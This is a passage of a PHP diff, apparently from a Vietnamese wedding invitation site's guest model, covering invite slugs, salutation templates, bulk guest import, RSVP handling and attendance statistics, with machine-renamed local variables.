+$_vkfpdv4 = array();
+foreach ($this->db->select('id, slug')->like('slug', $_vuxix5a, 'after')->get('invites')->result_array() as $_vfkmw8g) {
+if ((int) $_vfkmw8g['id'] !== (int) $_vm5nji7) {
+$_vkfpdv4[$_vfkmw8g['slug']] = TRUE;
+}
+}
+foreach ($this->db->select('invite_id, slug')->like('slug', $_vuxix5a, 'after')->get('invite_old_slugs')->result_array() as $_vfkmw8g) {
+if ((int) $_vfkmw8g['invite_id'] !== (int) $_vm5nji7) {
+$_vkfpdv4[$_vfkmw8g['slug']] = TRUE;
+}
+}
+// Hậu tố ngẫu nhiên 4 ký tự (vd co-lan-x7k2): link vẫn dễ đọc nhưng người lạ không đoán được từ tên khách
+// (link thiệp mở được thiệp riêng và trả lời tham dự thay khách). Dài tối đa 34 + 5 = 39 < 40 của route.
+do {
+$_vhvzyqi = $_vuxix5a . '-' . self::slug_suffix();
+} while (isset($_vkfpdv4[$_vhvzyqi]) || in_array($_vhvzyqi, $_vl8yw6u, TRUE));
+return $_vhvzyqi;
+}
+
+private static function slug_suffix()
+{
+$abc = 'abcdefghjkmnpqrstuvwxyz23456789'; // bỏ i, l, o, 0, 1 dễ nhầm khi đọc
+$out = '';
+for ($i = 0; $i < 4; $i++) {
+$out .= $abc[random_int(0, strlen($abc) - 1)];
+}
+return $out;
+}
+
+public function ensure_slugs()
+{
+$_vn5oeq4 = $this->db->where('source', 'invite')->where('slug IS NULL', NULL, FALSE)->get('invites')->result_array();
+foreach ($_vn5oeq4 as $_vk8r2j5) {
+$this->db->update('invites', array('slug' => $this->unique_slug($this->display_name($_vk8r2j5), $_vk8r2j5['id'])), array('id' => (int) $_vk8r2j5['id']));
+}
+return count($_vn5oeq4);
+}
+
+
+const SAL_MAX = 40; 
+const SAL_LEN = 30; 
+const SAL_TPL_LEN = 500;
+private $sal_cache = NULL;
+
+public function sal_key($_venh5hi)
+{
+return mb_strtolower(trim(preg_replace('/\s+/u', ' ', (string) $_venh5hi)));
+}
+
+public function salutations()
+{
+if ($this->sal_cache === NULL) {
+$_v9unkn6 = json_decode((string) setting('salutations'), TRUE);
+if (is_array($_v9unkn6) && ($_v9unkn6 === json_decode(Settings_model::SALUTATIONS_JSON_V1, TRUE)
+|| $_v9unkn6 === json_decode(Settings_model::SALUTATIONS_JSON, TRUE))) {
+
+$_v9unkn6 = $this->default_salutations();
+}
+$_vwegdi3 = is_array($_v9unkn6) ? $this->clean_salutations($_v9unkn6) : NULL;
+$this->sal_cache = is_array($_vwegdi3) ? $_vwegdi3 : $this->default_salutations();
+}
+return $this->sal_cache;
+}
+
+
+
+
+public function default_salutations()
+{
+$_vvpp5uh = lang_content();
+if ($_vvpp5uh === 'vi') {
+return json_decode(Settings_model::SALUTATIONS_JSON, TRUE);
+}
+if ($_vvpp5uh !== 'en') {
+$_vs1nka5 = APPPATH . 'language/' . $_vvpp5uh . '/salutations.json';
+$_vlnm2ub = is_file($_vs1nka5) ? json_decode((string) file_get_contents($_vs1nka5), TRUE) : NULL;
+if (is_array($_vlnm2ub) && $_vlnm2ub) {
+return $_vlnm2ub;
+}
+}
+return json_decode(Settings_model::SALUTATIONS_JSON_EN, TRUE);
+}
+
+
+
+
+public function clean_salutations(array $_va52j6e)
+{
+$_vn70ruq = array();
+$_vq2j0rr = array();
+foreach ($_va52j6e as $_v4sy12l) {
+if (!is_array($_v4sy12l)) {
+continue;
+}
+$_v9a9jjv = trim(preg_replace('/\s+/u', ' ', (string) ($_v4sy12l['s'] ?? '')));
+$_v0kah5x = trim(preg_replace('/[\x00-\x1F\x7F]+/u', ' ', (string) ($_v4sy12l['t'] ?? '')));
+if ($_v9a9jjv === '' && $_v0kah5x === '') {
+continue;
+}
+if ($_v9a9jjv === '') {
+return __('Mỗi lời mời mẫu cần có xưng hô đi kèm.');
+}
+if (mb_strlen($_v9a9jjv) > self::SAL_LEN) {
+return __('Xưng hô "{s}…" dài quá {n} ký tự.', array('s' => mb_substr($_v9a9jjv, 0, self::SAL_LEN), 'n' => self::SAL_LEN));
+}
+if (mb_strlen($_v0kah5x) > self::SAL_TPL_LEN) {
+return __('Lời mời mẫu của "{s}" dài quá {n} ký tự.', array('s' => $_v9a9jjv, 'n' => self::SAL_TPL_LEN));
+}
+$_vcfn73t = $this->sal_key($_v9a9jjv);
+if (isset($_vq2j0rr[$_vcfn73t])) {
+return __('Xưng hô "{s}" bị trùng — mỗi xưng hô chỉ một dòng.', array('s' => $_v9a9jjv));
+}
+$_vq2j0rr[$_vcfn73t] = TRUE;
+$_vn70ruq[] = array('s' => $_v9a9jjv, 't' => $_v0kah5x);
+}
+if (count($_vn70ruq) > self::SAL_MAX) {
+return __('Tối đa {n} xưng hô.', array('n' => self::SAL_MAX));
+}
+return $_vn70ruq;
+}
+
+public function save_salutations(array $_vw070ky)
+{
+$_vwgklrf = $this->clean_salutations($_vw070ky);
+if (!is_array($_vwgklrf)) {
+return $_vwgklrf;
+}
+$this->settings_model->set_many(array('salutations' => json_encode($_vwgklrf, JSON_UNESCAPED_UNICODE)));
+$this->sal_cache = NULL;
+return TRUE;
+}
+public function reset_salutations()
+{
+$this->settings_model->set_many(array('salutations' => Settings_model::SALUTATIONS_JSON));
+$this->sal_cache = NULL;
+}
+
+public function find_salutation($_vfvru32)
+{
+$_vfw5g4i = $this->sal_key($_vfvru32);
+if ($_vfw5g4i === '') {
+return NULL;
+}
+foreach ($this->salutations() as $_vdrij8j) {
+if ($this->sal_key($_vdrij8j['s']) === $_vfw5g4i) {
+return $_vdrij8j;
+}
+}
+return NULL;
+}
+
+public function canonical_salutation($_vptooqq)
+{
+$_v4wzgj7 = $this->find_salutation($_vptooqq);
+return $_v4wzgj7 ? $_v4wzgj7['s'] : trim(preg_replace('/\s+/u', ' ', (string) $_vptooqq));
+}
+
+private function known_salutations()
+{
+$_vxwsfqz = array();
+foreach ($this->salutations() as $_vqo0f62) {
+$_vxwsfqz[$this->sal_key($_vqo0f62['s'])] = $_vqo0f62['s'];
+}
+foreach (self::SALUTATIONS as $_vb8jk2v) {
+$_vxwsfqz += array($this->sal_key($_vb8jk2v) => $_vb8jk2v);
+}
+$_vnct91u = array_values($_vxwsfqz);
+usort($_vnct91u, function ($_v3pl9aq, $_v0lga0l) { return mb_strlen($_v0lga0l) - mb_strlen($_v3pl9aq); });
+return $_vnct91u;
+}
+
+
+
+
+public function split_salutation($_vsk96ch)
+{
+$_vsk96ch = trim(preg_replace('/\s+/u', ' ', (string) $_vsk96ch));
+$_vzp7ia0 = mb_strtolower($_vsk96ch);
+foreach ($this->known_salutations() as $_vhn1xnh) {
+$_vs4wuj4 = mb_strlen($_vhn1xnh);
+if (mb_substr($_vzp7ia0, 0, $_vs4wuj4) === mb_strtolower($_vhn1xnh) && mb_substr($_vsk96ch, $_vs4wuj4, 1) === ' ' && trim(mb_substr($_vsk96ch, $_vs4wuj4)) !== '') {
+return array($_vhn1xnh, trim(mb_substr($_vsk96ch, $_vs4wuj4)));
+}
+}
+return array('', $_vsk96ch);
+}
+
+
+
+
+public function invite_source($_v86hz61)
+{
+if (trim((string) $_v86hz61['invite_text']) !== '') {
+return array('own', '');
+}
+$_vmhi30s = $this->find_salutation($_v86hz61['salutation']);
+return ($_vmhi30s && $_vmhi30s['t'] !== '') ? array('sal', $_vmhi30s['s']) : array('common', '');
+}
+private function clean_fields(array $_v7afgss)
+{
+$_vk5ap4q = function ($_vk33wor, $_vprre8r) { return mb_substr(trim(preg_replace('/[\x00-\x1F\x7F]+/u', ' ', (string) $_vk33wor)), 0, $_vprre8r); };
+$_v06arfi = array();
+if (array_key_exists('name', $_v7afgss)) {
+$_v06arfi['name'] = $_vk5ap4q($_v7afgss['name'], 80);
+}
+if (array_key_exists('salutation', $_v7afgss)) {
+$_v06arfi['salutation'] = $this->canonical_salutation($_vk5ap4q($_v7afgss['salutation'], self::SAL_LEN));
+}
+if (array_key_exists('side', $_v7afgss)) {
+$_v06arfi['side'] = array_key_exists((string) $_v7afgss['side'], self::SIDES) ? (string) $_v7afgss['side'] : '';
+}
+if (array_key_exists('note', $_v7afgss)) {
+$_v06arfi['note'] = $_vk5ap4q($_v7afgss['note'], 200);
+}
+if (array_key_exists('phone', $_v7afgss)) {
+$_vmv6mo8 = $_vk5ap4q($_v7afgss['phone'], 20);
+$_v06arfi['phone'] = $_vmv6mo8 !== '' ? $_vmv6mo8 : NULL;
+}
+if (array_key_exists('invite_text', $_v7afgss)) {
+$_v78jevx = mb_substr(trim(str_replace("\r", '', (string) $_v7afgss['invite_text'])), 0, 500);
+$_v06arfi['invite_text'] = $_v78jevx !== '' ? $_v78jevx : NULL;
+}
+if (array_key_exists('max_guests', $_v7afgss)) {
+$_v5nbbqj = (int) $_v7afgss['max_guests'];
+$_v06arfi['max_guests'] = $_v5nbbqj > 0 ? min(20, $_v5nbbqj) : NULL;
+}
+return $_v06arfi;
+}
+
+
+
+
+public function create($_v50uy90, $_votqint = '', $_vwnwdja = '', $_vm0o9vm = 'invite', array $_vaf0kqi = array())
+{
+$this->error_field = '';
+if (array_key_exists('phone', $_vaf0kqi)) {
+$_vvnbb98 = $this->clean_phone($_vaf0kqi['phone']);
+if ($_vvnbb98 === FALSE) { 
+$this->error_field = 'phone';
+return __(self::PHONE_ERROR);
+}
+$_vaf0kqi['phone'] = $_vvnbb98;
+}
+$_v62i3go = $this->clean_fields(array('name' => $_v50uy90, 'side' => $_votqint, 'note' => $_vwnwdja) + $_vaf0kqi);
+if ($_v62i3go['name'] === '') {
+$this->error_field = 'name';
+return __('Hãy nhập tên khách.');
+}
+if ($_vm0o9vm === 'invite') {
+$_v8s9xv3 = isset($_vaf0kqi['slug']) ? strtolower(trim((string) $_vaf0kqi['slug'])) : '';
+if ($_v8s9xv3 !== '') {
+$_vrdk02y = $this->check_slug($_v8s9xv3);
+if ($_vrdk02y !== TRUE) {
+$this->error_field = 'slug';
+return $_vrdk02y;
+}
+} else {
+$_v8s9xv3 = $this->unique_slug($this->display_name($_v62i3go + array('salutation' => '')));
+}
+$_v62i3go['slug'] = $_v8s9xv3;
+}
+$_v62i3go += array('code' => $this->new_code(), 'source' => $_vm0o9vm === 'web' ? 'web' : 'invite', 'created_at' => now_str());
+$this->db->insert('invites', $_v62i3go);
+return $this->find($this->db->insert_id());
+}
+
+
+
+
+public function create_many($_v3elgig, $_v8tnw32 = '')
+{
+return $this->create_rows($this->parse_lines($_v3elgig, $_v8tnw32));
+}
+
+
+
+
+public function parse_lines($_vm0znv7, $_vuuinoh = '')
+{
+$_v6lfdwr = array();
+foreach (preg_split('/\R/u', (string) $_vm0znv7) as $_vxj8oz9) {
+$_vxj8oz9 = trim($_vxj8oz9);
+if ($_vxj8oz9 === '') {
+continue;
+}
+if (strpos($_vxj8oz9, '|') !== FALSE) {
+$_v4wemgv = array_map('trim', explode('|', $_vxj8oz9, 3));
+$_vna8yax = $_v4wemgv[0];
+$_vhevjav = isset($_v4wemgv[1]) ? $_v4wemgv[1] : '';
+$_vy4d288 = isset($_v4wemgv[2]) ? $_v4wemgv[2] : '';
+if ($_vhevjav === '' && !$this->is_salutation_only($_vna8yax)) { 
+list($_vna8yax, $_vhevjav) = $this->split_salutation($_vna8yax);
+}
+} elseif ($this->is_salutation_only($_vxj8oz9)) {
+list($_vna8yax, $_vhevjav, $_vy4d288) = array($_vxj8oz9, '', '');
+} else {
+list($_vna8yax, $_vhevjav) = $this->split_salutation($_vxj8oz9);
+$_vy4d288 = '';
+}
+
+
+$_v6lfdwr[] = array('salutation' => $_vna8yax, 'name' => $_vhevjav, 'side' => $_vuuinoh, 'invite_text' => $_vy4d288);
+}
+return $_v6lfdwr;
+}
+
+private function is_salutation_only($_vmalo0q)
+{
+$_v37wjmu = $this->sal_key($_vmalo0q);
+foreach ($this->known_salutations() as $_va5d0xw) {
+if ($this->sal_key($_va5d0xw) === $_v37wjmu) {
+return TRUE;
+}
+}
+return FALSE;
+}
+const BULK_MAX = 500;
+
+public function create_rows(array $_vk42i4i)
+{
+$_vju9vpj = $this->create_rows_report($_vk42i4i);
+return $_vju9vpj['created'];
+}
+
+
+
+
+
+
+
+public function create_rows_report(array $_vzcftf9)
+{
+$_vzdmxib = array('received' => 0, 'created' => 0, 'skipped' => 0, 'truncated' => 0, 'dups' => 0, 'over' => 0, 'failed' => array(), 'bad_phone' => 0);
+$_vis4pk0 = array();
+foreach ($_vzcftf9 as $_vmj7bei) {
+if (!is_array($_vmj7bei)) {
+continue;
+}
+$_vmj7bei = array(
+'salutation' => is_string($_vmj7bei['salutation'] ?? NULL) ? $_vmj7bei['salutation'] : '',
+'name' => is_string($_vmj7bei['name'] ?? NULL) ? trim(preg_replace('/\s+/u', ' ', $_vmj7bei['name'])) : '',
+'side' => is_string($_vmj7bei['side'] ?? NULL) ? $_vmj7bei['side'] : '',
+'invite_text' => is_string($_vmj7bei['invite_text'] ?? NULL) ? $_vmj7bei['invite_text'] : '',
+'phone' => is_string($_vmj7bei['phone'] ?? NULL) ? trim($_vmj7bei['phone']) : '',
+'note' => is_string($_vmj7bei['note'] ?? NULL) ? $_vmj7bei['note'] : '', 
+'max_guests' => is_scalar($_vmj7bei['max_guests'] ?? NULL) ? (int) $_vmj7bei['max_guests'] : 0, 
+);
+
+if ($_vmj7bei['phone'] === '' && ($_v7usydd = $this->split_phone($_vmj7bei['name']))) {
+list($_vmj7bei['name'], $_vmj7bei['phone']) = $_v7usydd;
+}
+
+$_vb8ssig = $this->clean_phone($_vmj7bei['phone']);
+if ($_vb8ssig === FALSE) {
+$_vmj7bei['phone'] = '';
+$_vmj7bei['_bad_phone'] = TRUE;
+} else {
+$_vmj7bei['phone'] = $_vb8ssig;
+}
+if ($_vmj7bei['name'] === '' && trim($_vmj7bei['salutation']) === '' && trim($_vmj7bei['invite_text']) === '') {
+continue; 
+}
+$_vis4pk0[] = $_vmj7bei;
+}
+$_vzdmxib['received'] = count($_vis4pk0);
+if (count($_vis4pk0) > self::BULK_MAX) {
+$_vzdmxib['over'] = count($_vis4pk0) - self::BULK_MAX;
+$_vis4pk0 = array_slice($_vis4pk0, 0, self::BULK_MAX);
+}
+$_vs95iq2 = $this->name_keys();
+$this->db->trans_start();
+foreach ($_vis4pk0 as $_vmj7bei) {
+if ($_vmj7bei['name'] === '') {
+$_vzdmxib['skipped']++;
+continue;
+}
+if (mb_strlen($_vmj7bei['name']) > 80) {
+$_vzdmxib['truncated']++;
+}
+$_v4ze4zl = $this->create($_vmj7bei['name'], $_vmj7bei['side'], $_vmj7bei['note'], 'invite', array(
+'salutation' => $this->canonical_salutation($_vmj7bei['salutation']),
+'invite_text' => $_vmj7bei['invite_text'],
+'phone' => $_vmj7bei['phone'],
+'max_guests' => $_vmj7bei['max_guests'] > 0 ? $_vmj7bei['max_guests'] : '',
+));
+if (!is_array($_v4ze4zl)) {
+$_vzdmxib['failed'][] = mb_strimwidth($_vmj7bei['name'], 0, 40, '…') . ': ' . $_v4ze4zl;
+continue;
+}
+$_vzdmxib['created']++;
+if (!empty($_vmj7bei['_bad_phone'])) {
+$_vzdmxib['bad_phone']++;
+}
+$_v109o4m = $this->sal_key($this->display_name($_v4ze4zl));
+if (isset($_vs95iq2[$_v109o4m])) {
+$_vzdmxib['dups']++;
+}
+$_vs95iq2[$_v109o4m] = TRUE;
+}
+$this->db->trans_complete();
+return $_vzdmxib;
+}
+
+
+
+
+public function split_phone($_vo3vfbd)
+{
+
+
+
+if (preg_match('/^(.*?)(?:^|[\s,;:|\-–]+)\(?((?:\+?84 ?|0)\d(?:[ .\-]?\d){7,10}|[35789]\d{8})\)?\s*$/u', trim((string) $_vo3vfbd), $_vgjgebl)
+&& trim($_vgjgebl[1]) !== '') {
+$_vv9a7ki = trim($_vgjgebl[2]);
+return array(trim($_vgjgebl[1]), preg_match('/^[35789]\d{8}$/', $_vv9a7ki) ? '0' . $_vv9a7ki : $_vv9a7ki);
+}
+return NULL;
+}
+
+
+
+
+
+public function clean_phone($_v80s5yq)
+{
+$_v80s5yq = trim((string) $_v80s5yq);
+if ($_v80s5yq === '') {
+return '';
+}
+
+$_v80s5yq = preg_replace_callback('/\(([^)]*)\)?/', function ($_v31x1y5) {
+return preg_match('/\d/', $_v31x1y5[1]) ? ' ' . $_v31x1y5[1] . ' ' : ' ';
+}, $_v80s5yq);
+$_vgq9epn = trim(preg_replace('/\s+/', ' ', preg_replace('/[^0-9+ .\-]/', '', $_v80s5yq)), ' .-');
+if (preg_match('/^[35789]\d{8}$/', $_vgq9epn)) {
+$_vgq9epn = '0' . $_vgq9epn; 
+}
+$_vu4mc0l = strlen(preg_replace('/\D/', '', $_vgq9epn));
+return ($_vu4mc0l >= 8 && $_vu4mc0l <= 15) ? mb_substr($_vgq9epn, 0, 20) : FALSE;
+}
+const PHONE_ERROR = 'Số điện thoại chưa đúng — cần 8–15 chữ số (vd 0912 345 678), hoặc để trống.';
+
+private function name_keys()
+{
+$_vvevyit = array();
+foreach ($this->db->select('salutation, name')->get('invites')->result_array() as $_vrlmwrf) {
+$_vvevyit[$this->sal_key($this->display_name($_vrlmwrf))] = TRUE;
+}
+return $_vvevyit;
+}
+
+public function duplicate_ids()
+{
+$_v8w1g2e = array();
+foreach ($this->db->select('id, salutation, name')->get('invites')->result_array() as $_vlhpjww) {
+$_v8w1g2e[$this->sal_key($this->display_name($_vlhpjww))][] = (int) $_vlhpjww['id'];
+}
+$_v0ub7eg = array();
+foreach ($_v8w1g2e as $_vh6udec) {
+if (count($_vh6udec) > 1) {
+$_v0ub7eg += array_fill_keys($_vh6udec, TRUE);
+}
+}
+return $_v0ub7eg;
+}
+
+public function update($_vnx7dmq, array $_v25qrck)
+{
+$this->error_field = '';
+$_v4yzrk1 = $this->find($_vnx7dmq);
+if (!$_v4yzrk1) {
+return __('Không tìm thấy lời mời.');
+}
+if (array_key_exists('phone', $_v25qrck)) {
+$_v61qfn0 = $this->clean_phone($_v25qrck['phone']);
+if ($_v61qfn0 === FALSE) {
+$this->error_field = 'phone';
+return __(self::PHONE_ERROR);
+}
+$_v25qrck['phone'] = $_v61qfn0;
+}
+$_v81hecw = $this->clean_fields($_v25qrck);
+if (isset($_v81hecw['name']) && $_v81hecw['name'] === '') {
+$this->error_field = 'name';
+return __('Tên khách không được để trống.');
+}
+if ($_v4yzrk1['source'] === 'invite' && array_key_exists('slug', $_v25qrck)) {
+$_vyz0a7n = strtolower(trim((string) $_v25qrck['slug']));
+if ($_vyz0a7n === '') {
+$_vyz0a7n = $this->unique_slug($this->display_name($_v81hecw + $_v4yzrk1), $_v4yzrk1['id']);
+}
+$_vjprm5k = $this->check_slug($_vyz0a7n, $_v4yzrk1['id']);
+if ($_vjprm5k !== TRUE) {
+$this->error_field = 'slug';
+return $_vjprm5k;
+}
+$_v81hecw['slug'] = $_vyz0a7n;
+}
+$this->db->trans_start();
+if (isset($_v81hecw['slug']) && !empty($_v4yzrk1['slug']) && $_v81hecw['slug'] !== $_v4yzrk1['slug']) {
+
+$this->db->query('INSERT INTO invite_old_slugs (slug, invite_id, created_at) VALUES (?, ?, ?)
+				ON CONFLICT(slug) DO UPDATE SET invite_id = excluded.invite_id', array($_v4yzrk1['slug'], (int) $_vnx7dmq, now_str()));
+$this->db->delete('invite_old_slugs', array('slug' => $_v81hecw['slug'], 'invite_id' => (int) $_vnx7dmq));
+}
+if ($_v81hecw) {
+$this->db->update('invites', $_v81hecw, array('id' => (int) $_vnx7dmq));
+}
+$this->db->trans_complete();
+return TRUE;
+}
+
+public function old_slugs($_vq5o1pb)
+{
+return array_column($this->db->select('slug')->order_by('created_at')->get_where('invite_old_slugs',
+array('invite_id' => (int) $_vq5o1pb))->result_array(), 'slug');
+}
+public function delete($_vqguj8m)
+{
+$this->db->delete('invite_old_slugs', array('invite_id' => (int) $_vqguj8m));
+return $this->db->delete('invites', array('id' => (int) $_vqguj8m));
+}
+
+public function mark_opened($_vd7ccxn)
+{
+if (empty($_vd7ccxn['opened_at'])) {
+$this->db->update('invites', array('opened_at' => now_str()), array('id' => (int) $_vd7ccxn['id']));
+}
+}
+
+public function guest_limit($_v46gcck)
+{
+$_vyvt8v8 = (int) (isset($_v46gcck['max_guests']) ? $_v46gcck['max_guests'] : 0);
+return $_vyvt8v8 > 0 ? min(20, $_vyvt8v8) : 20;
+}
+
+
+
+public function respond($_vfiqudr, $_vli9u6t, $_vkcsfkz, $_v2l3bzq, $_vnwg5jk = '')
+{
+$this->load->model('wish_model');
+$_v2l3bzq = mb_substr(trim((string) $_v2l3bzq), 0, 1000);
+$_vuk3qub = (int) $_vfiqudr['wish_id'];
+$_v4dljzo = $this->display_name($_vfiqudr);
+if ($_v2l3bzq !== '') {
+$_vq9yi8s = setting('wishes_approval') === '1';
+$_vq12302 = $_vuk3qub ? $this->db->get_where('wishes', array('id' => $_vuk3qub))->row_array() : NULL;
+if ($_vq12302) {
+$_vzlyipn = array('name' => $_v4dljzo);
+if ((string) $_vq12302['message'] !== $_v2l3bzq) {
+
+
+$_vzlyipn['message'] = $_v2l3bzq;
+$_vzlyipn['status'] = $_vq9yi8s ? 'pending' : ($_vq12302['status'] === 'hidden' ? 'hidden' : 'approved');
+$_vzlyipn['updated_at'] = now_str();
+}
+$this->db->update('wishes', $_vzlyipn, array('id' => $_vuk3qub));
+} else {
+$_vuk3qub = $this->wish_model->add($_v4dljzo, $_v2l3bzq, $_vq9yi8s ? 'pending' : 'approved');
+}
+} else {
+
+$_v2l3bzq = trim((string) $_vfiqudr['message']);
+}
+$this->db->update('invites', array(
+'status' => $_vli9u6t,
+'guests' => $_vli9u6t === 'yes' ? max(1, min($this->guest_limit($_vfiqudr), (int) $_vkcsfkz)) : 0,
+'message' => $_v2l3bzq !== '' ? $_v2l3bzq : NULL,
+'phone' => $_vnwg5jk !== '' ? mb_substr($_vnwg5jk, 0, 20) : $_vfiqudr['phone'],
+'wish_id' => $_vuk3qub ?: NULL,
+'responded_at' => now_str(),
+), array('id' => (int) $_vfiqudr['id']));
+return $this->find($_vfiqudr['id']);
+}
+
+
+
+
+public function invite_text($_v9moxo2, $_v6gpqln = '', $_v1izag4 = '')
+{
+$_vxlpp3b = $this->invite_source($_v9moxo2);
+if ($_vxlpp3b[0] === 'own') {
+$_vgabgfz = trim((string) $_v9moxo2['invite_text']);
+} elseif ($_vxlpp3b[0] === 'sal') {
+$_vgabgfz = $this->find_salutation($_v9moxo2['salutation'])['t'];
+} else {
+$_vgabgfz = trim($this->settings_model->localized('invite_template'));
+}
+return $this->fill_template($_vgabgfz, $_v9moxo2['salutation'], $_v9moxo2['name'], $_v6gpqln, $_v1izag4);
+}
+
+public function fill_template($_vqv4htf, $_vk6mfvs, $_vt5c07r, $_vveirzn = '', $_v25ajcv = '')
+{
+$_vk6mfvs = trim((string) $_vk6mfvs);
+
+$_vlzf0s4 = $_vk6mfvs !== '' && lang_content() === 'vi' ? mb_strtolower(mb_substr($_vk6mfvs, 0, 1)) . mb_substr($_vk6mfvs, 1) : $_vk6mfvs;
+$_vqv4htf = (string) $_vqv4htf;
+
+
+if ($_vk6mfvs !== '') {
+$_vhig5t6 = self::join_salutation($_vlzf0s4, (string) $_vt5c07r);
+$_vqv4htf = str_replace(array('{ten}{xung_ho}', '{xung_ho} {ten}', '{xung_ho}{ten}'), '{xung_ho_ten}', $_vqv4htf);
+} else {
+$_vhig5t6 = trim((string) $_vt5c07r);
+$_vqv4htf = str_replace(array('{ten}{xung_ho}', '{xung_ho} {ten}', '{xung_ho}{ten}'), '{xung_ho_ten}', $_vqv4htf);
+}
+$_vcnov3z = strtr($_vqv4htf, array('{xung_ho_ten}' => $_vhig5t6, '{xung_ho}' => $_vlzf0s4, '{ten}' => trim((string) $_vt5c07r), '{cap_doi}' => $_vveirzn, '{ngay}' => $_v25ajcv));
+
+$_vcnov3z = preg_replace('/([\x{0e00}-\x{0eff}\x{4e00}-\x{9fff}])(\p{Latin})/u', '$1 $2', $_vcnov3z);
+$_vcnov3z = preg_replace('/(\p{Latin})([\x{0e00}-\x{0eff}])/u', '$1 $2', $_vcnov3z);
+$_vcnov3z = trim(preg_replace('/[ \t]{2,}/u', ' ', $_vcnov3z));
+$_vcnov3z = preg_replace('/ +([,.!?])/u', '$1', $_vcnov3z); 
+return $_vcnov3z !== '' ? mb_strtoupper(mb_substr($_vcnov3z, 0, 1)) . mb_substr($_vcnov3z, 1) : '';
+}
+
+const FILTERS = array('unopened', 'opened', 'opened_all', 'invited', 'yes', 'no', 'pending', 'web');
+
+
+
+
+
+
+public function all($_v4ugxlw = '', $_v9lvu7p = '', $_vf50h1r = '', $_vaw7h4t = 0, $_v5ggx2w = 0)
+{
+$this->filter_where($_v4ugxlw, $_v9lvu7p, $_vf50h1r);
+$this->db->order_by('COALESCE(responded_at, created_at) DESC, id DESC');
+if ((int) $_vaw7h4t > 0) { 
+$this->db->limit((int) $_vaw7h4t, max(0, (int) $_v5ggx2w));
+}
+return $this->db->get('invites')->result_array();
+}
+
+public function count_all($_v98jlwe = '', $_vv5vu0j = '', $_v9u1ge1 = '')
+{
+$this->filter_where($_v98jlwe, $_vv5vu0j, $_v9u1ge1);
+return (int) $this->db->count_all_results('invites');
+}
+
+
+
+
+public function position($_v4ii65n, $_vhlwkxy = '', $_v4apsri = '', $_vogkktb = '')
+{
+$_vkjgwoj = $this->find($_v4ii65n);
+if (!$_vkjgwoj) {
+return -1;
+}
+$this->filter_where($_vhlwkxy, $_v4apsri, $_vogkktb);
+if (!$this->db->where('id', (int) $_v4ii65n)->count_all_results('invites')) {
+return -1;
+}
+$_vb3xu39 = $this->db->escape((string) ($_vkjgwoj['responded_at'] ?: $_vkjgwoj['created_at']));
+$this->filter_where($_vhlwkxy, $_v4apsri, $_vogkktb);
+$this->db->where('(COALESCE(responded_at, created_at) > ' . $_vb3xu39 . ' OR (COALESCE(responded_at, created_at) = ' . $_vb3xu39
+. ' AND id > ' . (int) $_v4ii65n . '))', NULL, FALSE);
+return (int) $this->db->count_all_results('invites');
+}
+
+private function filter_where($_v9qqkmh, $_v68bvcy, $_vhkke3u)
+{
+switch ($_v9qqkmh) {
+case 'unopened':
+$this->db->where('source', 'invite')->where('status', 'pending')->where('opened_at IS NULL', NULL, FALSE);
+break;
+case 'opened':
+$this->db->where('source', 'invite')->where('status', 'pending')->where('opened_at IS NOT NULL', NULL, FALSE);
+break;
+case 'opened_all':
+$this->db->where('source', 'invite')->where('opened_at IS NOT NULL', NULL, FALSE);
+break;
+case 'invited':
+$this->db->where('source', 'invite');
+break;
+case 'yes':
+case 'no':
+case 'pending':
+$this->db->where('status', $_v9qqkmh);
+break;
+case 'web':
+$this->db->where('source', 'web');
+break;
+}
+if ($_v68bvcy === 'none') {
+$this->db->group_start()->where('side', '')->or_where('side IS NULL', NULL, FALSE)->group_end();
+} elseif (in_array($_v68bvcy, array('groom', 'bride'), TRUE)) {
+$this->db->where('side', $_v68bvcy);
+}
+$_vhkke3u = trim((string) $_vhkke3u);
+if ($_vhkke3u !== '') {
+$this->db->group_start()->like('name', $_vhkke3u)->or_like('salutation', $_vhkke3u)->or_like('slug', ascii_slug($_vhkke3u, 40) ?: $_vhkke3u)
+->or_like('phone', $_vhkke3u)->or_like('note', $_vhkke3u)->group_end();
+}
+}
+
+
+
+
+public function stats()
+{
+$_v6ppysm = $this->db->query("SELECT
+				COUNT(*) AS total,
+				COUNT(CASE WHEN source = 'invite' THEN 1 END) AS invited,
+				COUNT(CASE WHEN status = 'yes' THEN 1 END) AS yes,
+				COUNT(CASE WHEN status = 'no' THEN 1 END) AS no,
+				COUNT(CASE WHEN status = 'pending' THEN 1 END) AS pending,
+				COUNT(CASE WHEN status = 'pending' AND opened_at IS NOT NULL THEN 1 END) AS opened,
+				COALESCE(SUM(CASE WHEN status = 'yes' THEN guests END), 0) AS people,
+				COALESCE(SUM(CASE WHEN status = 'yes' AND side = 'groom' THEN guests END), 0) AS people_groom,
+				COALESCE(SUM(CASE WHEN status = 'yes' AND side = 'bride' THEN guests END), 0) AS people_bride,
+				COUNT(CASE WHEN source = 'invite' AND opened_at IS NOT NULL THEN 1 END) AS inv_opened,
+				COUNT(CASE WHEN source = 'invite' AND status = 'yes' THEN 1 END) AS inv_yes,
+				COUNT(CASE WHEN source = 'invite' AND status = 'no' THEN 1 END) AS inv_no,
+				COUNT(CASE WHEN source = 'invite' AND status = 'pending' THEN 1 END) AS inv_pending,
+				COUNT(CASE WHEN source = 'invite' AND status = 'pending' AND opened_at IS NULL THEN 1 END) AS inv_unopened,
+				COALESCE(SUM(CASE WHEN source = 'invite' AND status = 'yes' THEN guests END), 0) AS inv_people,
+				COUNT(CASE WHEN source = 'invite' AND side = 'groom' THEN 1 END) AS inv_groom,
+				COUNT(CASE WHEN source = 'invite' AND side = 'bride' THEN 1 END) AS inv_bride,
+				COUNT(CASE WHEN source = 'invite' AND side = 'groom' AND status = 'yes' THEN 1 END) AS inv_groom_yes,
+				COUNT(CASE WHEN source = 'invite' AND side = 'bride' AND status = 'yes' THEN 1 END) AS inv_bride_yes,
+				COUNT(CASE WHEN source = 'invite' AND side = 'groom' AND status <> 'pending' THEN 1 END) AS inv_groom_resp,
+				COUNT(CASE WHEN source = 'invite' AND side = 'bride' AND status <> 'pending' THEN 1 END) AS inv_bride_resp,
+				COUNT(CASE WHEN source = 'web' THEN 1 END) AS web,
+				COUNT(CASE WHEN source = 'web' AND status = 'yes' THEN 1 END) AS web_yes,
+				COUNT(CASE WHEN source = 'web' AND status = 'no' THEN 1 END) AS web_no,
+				COALESCE(SUM(CASE WHEN source = 'web' AND status = 'yes' THEN guests END), 0) AS web_people,
+				COUNT(CASE WHEN source = 'invite' AND COALESCE(side, '') NOT IN ('groom', 'bride') THEN 1 END) AS inv_common,
